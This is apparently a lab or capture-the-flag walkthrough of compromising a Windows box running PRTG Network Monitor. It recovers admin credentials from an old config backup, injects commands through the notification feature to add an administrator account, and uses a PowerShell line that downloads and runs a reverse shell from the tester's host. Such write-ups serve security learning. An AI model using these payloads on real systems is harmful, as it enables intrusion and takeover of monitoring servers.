initial scans show ftp, 80, smb open
ftp has anonymous login, we get user.txt
there, we see a PRTG Network monitoring tool runnin, in Program Files (x86)
little research on it, shows the passwords are stored in C:\PogramData\Paessler
as PRTG\ Configuration.dat.bak. But that file wasnt there.
We see a PRTG\ Configuration.old.bak tho, so we get it, and find the username:password for a dblogin. prtgadmin:PrTg@dmin2018

Port80 Webpage had a login window, so we try it there.
the creds dont work, so we try the same password with 2019, and it works

There, under tickets, we see a "Software updates are available" ticket.
Which would usually mean the older vesrion is out of date, and possibly vulnerable.
We find an exploit, run it, and it asks to paste the cookies once we have logged into the webpage. It adds a new user pentest with password P3ntest! into administrators group
loginto it,
`impacket-psexec pentest@10.129.230.176`

---
manual way of doing the exploit
The CVE said we can get the webpage to run commands on root level by triggering a notification. To do so, go to
setup->account settings->notifications
Add new notification
Change Program File type to "Demo exe notification - ps1"
Change parameters to `abc.txt | net user aj password1 /add ; net localgroup administrators aj /add`
Save it, leave the rest of the fields
Now, on the right to your notification name, click on edit, and click on bell icon to trigger notification
Wait a few mins, and use psexec
`impacket-psexec aj@10.129.230.176`

---
Alternatively, we can also make the command injection to send a reverse shell
Host nishaang's Invoke-ReverseShell.ps1 as rshell.ps1 and a the las line, add the "example line", modified with IP and PORT
`test | IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8990/rshell.ps1')`

This doesnt work directly, so we'll have to base64 encode it
`cat rshell.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard`
Then, run the shell as `powershell -enc <paste it>`